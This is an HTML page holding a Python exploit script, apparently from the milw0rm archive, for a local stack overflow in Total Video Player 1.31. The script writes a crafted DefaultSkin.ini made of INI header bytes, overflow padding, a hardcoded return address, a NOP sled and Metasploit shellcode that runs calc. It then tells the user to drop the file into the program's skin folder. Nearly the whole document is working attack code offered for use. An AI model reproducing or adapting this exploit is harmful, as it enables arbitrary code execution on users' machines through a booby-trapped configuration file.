<html><head><title>Total Video Player 1.31 (DefaultSkin.ini) Local Stack Overflow Exploit</title></head><pre>#!/usr/bin/python
import socket
print &quot;******************************************************&quot;
print &quot; Total Video Player V1.31 Local Stack Overflow\n&quot;
print &quot; Author: His0k4&quot;
print &quot; Tested on: Windows XP Pro SP2 Fr\n&quot;
print &quot; Greetings to:&quot;
print &quot; All friends &amp; muslims HaCkers(dz)\n&quot;
print &quot; dz-secure.com\n snakespc.com\n dz-security.net&quot;
print &quot;******************************************************&quot;

header1 = (
	&quot;\x5B\x57\x69\x6E\x64\x6F\x77\x73\x5D\x0A\x50\x6C\x69\x73\x74\x57&quot;
	&quot;\x69\x6E\x64\x6F\x77\x20\x3D\x20\x70\x6C\x73\x2E\x64\x6C\x6C\x2C&quot;
	&quot;\x49\x44\x0A\x0A\x5B\x4D\x61\x69\x6E\x57\x69\x6E\x64\x6F\x77\x53&quot;
	&quot;\x43\x52\x45\x45\x4E\x5D\x4D\x61\x69\x6E\x3D\x4E\x6F\x72\x6D\x61&quot;
	&quot;\x6C\x2E\x62\x6D\x70\x0A\x0A\x5B\x50\x6C\x69\x73\x74\x57\x69\x6E&quot;
	&quot;\x64\x6F\x77\x53\x43\x52\x45\x45\x4E\x5D\x0A\x4D\x61\x69\x6E\x3D&quot;
	&quot;\x50\x4C\x42\x75\x74\x74\x6F\x6E\x4E\x6F\x72\x6D\x61\x6C\x2E\x62&quot;
	&quot;\x6D\x70\x0A\x0A\x5B\x50\x6C\x69\x73\x74\x57\x69\x6E\x64\x6F\x77&quot;
	&quot;\x4C\x49\x53\x54\x43\x54\x52\x4C\x53\x54\x59\x4C\x45\x5D\x0A\x43&quot;
	&quot;\x6F\x6C\x75\x6D\x6E\x48\x65\x61\x64\x65\x72\x53\x70\x61\x6E\x3D&quot;)

header2=(
	&quot;\x2E\x62\x6D\x70\x0A\x56\x65\x72\x74\x69\x63\x6C\x65\x53\x63\x72&quot;
	&quot;\x6F\x6C\x6C\x42\x61\x72\x54\x68\x75\x6D\x62\x3D\x56\x65\x72\x74&quot;
	&quot;\x69\x63\x6C\x65\x53\x63\x72\x6F\x6C\x6C\x42\x61\x72\x54\x68\x75&quot;
	&quot;\x6D\x62\x2E\x62\x6D\x70&quot;)

# win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
shellcode=(
	&quot;\x29\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd5&quot;
	&quot;\xc5\x35\xef\x83\xeb\xfc\xe2\xf4\x29\x2d\x71\xef\xd5\xc5\xbe\xaa&quot;
	&quot;\xe9\x4e\x49\xea\xad\xc4\xda\x64\x9a\xdd\xbe\xb0\xf5\xc4\xde\xa6&quot;
	&quot;\x5e\xf1\xbe\xee\x3b\xf4\xf5\x76\x79\x41\xf5\x9b\xd2\x04\xff\xe2&quot;
	&quot;\xd4\x07\xde\x1b\xee\x91\x11\xeb\xa0\x20\xbe\xb0\xf1\xc4\xde\x89&quot;
	&quot;\x5e\xc9\x7e\x64\x8a\xd9\x34\x04\x5e\xd9\xbe\xee\x3e\x4c\x69\xcb&quot;
	&quot;\xd1\x06\x04\x2f\xb1\x4e\x75\xdf\x50\x05\x4d\xe3\x5e\x85\x39\x64&quot;
	&quot;\xa5\xd9\x98\x64\xbd\xcd\xde\xe6\x5e\x45\x85\xef\xd5\xc5\xbe\x87&quot;
	&quot;\xe9\x9a\x04\x19\xb5\x93\xbc\x17\x56\x05\x4e\xbf\xbd\x35\xbf\xeb&quot;
	&quot;\x8a\xad\xad\x11\x5f\xcb\x62\x10\x32\xa6\x54\x83\xb6\xc5\x35\xef&quot;)
	
buffer = header1 + &quot;\x41&quot;*221 + &quot;\x7C\xE1\xA7\x7C&quot; + &quot;\x90&quot;*20 + shellcode + header2

try:
    out_file = open(&quot;DefaultSkin.ini&quot;,'w')
    out_file.write(buffer)
    out_file.close()
    print(&quot;\n Exploit file created!, Now replace this file in Skins\DefaultSkin folder\n and run the program\n&quot;)
except:
    print &quot;Error&quot;

# milw0rm.com [2009-01-20]</pre></html>